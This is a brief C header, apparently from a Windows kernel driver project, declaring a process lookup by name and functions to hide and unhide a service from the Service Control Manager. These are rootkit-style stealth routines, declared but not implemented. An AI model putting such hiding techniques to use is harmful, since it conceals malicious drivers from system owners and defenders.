#pragma once


NTSTATUS
GetEProcessByName (
  WCHAR *processname, 
  PEPROCESS *proc
  );

NTSTATUS HideFromSCManager(WCHAR *service);
NTSTATUS UnhideFromSCManager();
